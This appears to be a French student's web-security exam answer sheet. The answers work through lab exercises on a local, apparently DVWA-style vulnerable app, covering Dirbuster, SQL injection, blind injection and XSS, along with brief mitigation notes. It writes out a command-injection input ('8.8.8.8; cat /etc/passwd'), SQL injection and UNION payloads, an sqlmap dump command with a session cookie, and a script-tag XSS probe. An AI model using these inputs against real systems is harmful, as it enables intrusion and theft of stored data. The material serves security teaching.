# Eval

SIMON EYRAGNE DFS 13


## Question 1
Performance parfaite;
<html> missing [lang] attribute; interpretation du navigateur selon la langue de l'utilisateur,
<img> missing [alt]: mettre description des images;
<meta name="viewport"> missing; pas d'optimisation pour les mobiles;
 mauvaise utilisation des fontsizes
 meta description pour le document,
  page bloqué pour l'indexation


## Question 2
un dossier config

Dirbuster déduit l'arborescence d'un site web depuis les requete HTTP si code 403 (forbidden) alors le fichier existe;
Pour se protéger, on peut limiter le nombre de requete depuis L'IP; Renvoyer code 404(not found) pour tous les fichiers;

## Question 3
8.8.8.8; cat /etc/passwd
chaine après la commande ping, j'affiche le fichier avec le cat 
possibilité d'exécuter des commandes OS, vol d'information, modification du server;
-validation des inputs: taille, min and max length;
-on escape les caractères ';'

## Question 4


## Question 5
Premier test avec ', qui renvoie une erreur sql;
2eme test avec  ' OR 1=1 -- , qui renvoie la liste + password des user
3eme test avec ' OR 1=1 UNION SELECT 1,1,1 -- , pas le bon nombre de colonnes
4eme avec ' OR 1=1 UNION SELECT 1,2 -- 
' OR 1=1 UNION SELECT CONCAT(information_schema.tables),2 --; unknown table information_schema 


## Question 6

sqlmap -u "http://localhost/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --dbms=mysql --dump --cookie="PHPSESSID=nhea6jcj46io50n8b7r4dl1135; security=low" -b --current-db --current-user

Une injection SQL aveugle demande a la DB des questions vrai ou faux

## Question 7
<script>alert('js')</script>
On passe une balise script dans l'input
Faille: script pour récupérer des informations
Protection: on escape les caractère, mise en place d'un WAF

## Question 8

<script>alert('js')</script>
On passe une balise script dans l'input
Dans le cas d'une XSS stocké, le script malicieux est stocké en base
et peut donc se déclencher a tout moment;

## Question 9

Confidentiality, Integrityn, Availabitlity
Principe du transport de données


